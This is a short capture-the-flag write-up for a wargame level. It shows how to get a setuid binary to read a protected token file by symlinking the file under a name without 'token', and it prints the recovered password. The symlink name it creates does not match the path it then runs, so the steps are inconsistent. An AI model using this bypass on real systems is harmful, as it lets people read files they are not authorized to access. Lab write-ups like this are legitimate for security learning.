# level08 solution
Given setuid elf and token file with no permissions to read it. We can run setuid binary with ltrace to get the idea of what it's doing:

    __libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
    strstr("token", "token")                                   = "token"
    printf("You may not access '%s'\n", "token"You may not access 'token'
    )               = 27
    exit(1 <unfinished ...>
    +++ exited (status 1) +++

This binary checks for presence of word token in provided path. We can bypass this check by simply creating symlink to this file with name that does not contain 'token' word:

    cd /tmp
    ln -s /home/user/level08/token level08_flag
    cd -

Then we can run program with provided symlink:

    ./level08 /tmp/flag
    quif5eloekouj29ke0vouxean

Token file contains password for flag08 user.
